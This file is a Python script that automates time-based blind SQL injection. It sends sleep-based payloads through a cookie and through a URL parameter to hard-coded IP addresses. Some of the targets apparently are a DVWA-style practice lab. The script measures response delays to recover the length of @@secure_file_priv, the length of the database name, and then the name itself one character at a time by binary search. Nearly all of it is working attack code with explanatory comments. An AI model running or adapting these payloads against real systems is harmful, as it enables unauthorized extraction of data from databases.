import requests
import datetime

#cookie blind time injection
def get_len_cookie():
    for i in range(0,30):
        url="http://119.6.122.74:2038/menu.php"
        cookies={
            'user':'admin'
        }
        #Suitable for character cookie injection
        #If the conditions are met, delay 3s
        #The last â€˜% d is closed with the server-side statement, so the end of the comment is not used
        #cookies["user"] += "' and sleep(3) and (select length(@@secure_file_priv))='%d"%(i)
        #If you do not use sentence closure, you must add a comment at the end
        cookies["user"] += "' and sleep(3) and (select length(@@secure_file_priv))=%d" % (i)+'%23'
        time1 = datetime.datetime.now()
        re = requests.get(url,cookies=cookies)
        time2=datetime.datetime.now()
        sec=(time2-time1).seconds
        if sec >=3:
            print(i)
            break
    print("database_len:",i)

#Get the length of a certain data
def get_len():
    for i in range(0,27):
        #Landing page
        url="http://43.247.91.228:81/vulnerabilities/sqli_blind/?Submit=Submit&id=1"
        #Need to add the payload after the injection point
        # Time-based blinds, also applies to general blinds
        payload="' and sleep(3) and (select length(database()))=%d"%(i)
        #Set cookie, suitable for those who need to log in, you can also connect the payload to cookie and implement cookie injection
        cookies={
            'security':'low',
            'PHPSESSID':'hrcmspo3fqgdtg2n9aujucj8b6'
        }
        #Record the current time
        time1 = datetime.datetime.now()
        #Submit the get request and add a comment at the end
        re = requests.get(url+payload+'%23',cookies=cookies)
        time2=datetime.datetime.now()
        sec=(time2-time1).seconds
        if sec >=3:
            print(i)
            break
    print("database_len:",i)

#Enter the data length to get the data content
def get_name(len):
    name=''
    for j in range(1,len+1):
        #Traverse to get the character at each position
        name+=get_char(j)
        print(name)
    print("database_name:",name)

#Blind guess the character in the characteristic position
def get_char(index):
    #ascii The minimum characters that can be entered on the table are 32 and the maximum is 127
    min = 32
    max = 127
    a=0
    #Perform binary search
    while(min<max):
        #i is the middle number
        i = int((min + max) / 2)
        #If the value of i in the previous round is the same as the value of i in this round, it means that the correct value is found and the character is returned
        if a==i:
            return chr(i)
        url = "http://43.247.91.228:81/vulnerabilities/sqli_blind/?Submit=Submit&id=1"
        #Use the ascii decimal comparison of the character at a specific position
        payload = "' and sleep(3) and ascii(substr((database()),%d,1))<%d" % (index, i)
        #print(payload)
        cookies = {
            'security': 'low',
            'PHPSESSID': 'hrcmspo3fqgdtg2n9aujucj8b6'
        }
        t1 = datetime.datetime.now()
        re = requests.get(url + payload + '%23', cookies=cookies)
        t2 = datetime.datetime.now()
        sec = (t2 - t1).seconds
        #If the index of the requested character> i
        if sec<3:
            #Replace the lower limit of the value with i
            min=i
        else:
            # Otherwise replace the upper limit of the value with i
            max=i
        #Save i value
        a=i
